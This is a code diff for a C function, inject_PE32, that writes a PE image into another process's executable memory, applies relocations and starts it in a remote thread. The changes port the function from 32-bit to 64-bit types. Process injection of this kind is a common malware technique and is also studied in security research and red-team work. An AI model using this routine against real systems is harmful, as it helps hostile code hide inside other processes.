@@ -45,7 +45,7 @@ bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
         return false;
     }
     SIZE_T written = 0;
-    const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
+    const ULONGLONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
     DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;
 
     LPVOID remoteAddress = VirtualAllocEx(hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -68,10 +68,10 @@ bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
         printf("Could not copy PE file\n");
         return false;
     }
-    printf("remoteAddress = %x\n", remoteAddress);
+    printf("remoteAddress = %p\n", remoteAddress);
     //if the base address of the payload changed, we need to apply relocations:
-    if ((LONG)remoteAddress != oldImageBase) {
-        if (apply_relocations((LONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
+    if ((ULONGLONG) remoteAddress != oldImageBase) {
+        if (apply_relocations((ULONGLONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
             printf("[ERROR] Could not relocate image!\n");
             return false;
         }
@@ -89,7 +89,7 @@ bool inject_PE32(HANDLE hProcess, BYTE* payload, SIZE_T payload_size)
     //free the localy allocated copy
     VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);
 
-    LPVOID newEP = (LPVOID)((DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint);
+    LPVOID newEP = (LPVOID)((ULONGLONG) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint);
     printf("newEP = %p\n", newEP);
     run_injected_in_new_thread(hProcess, newEP);
 
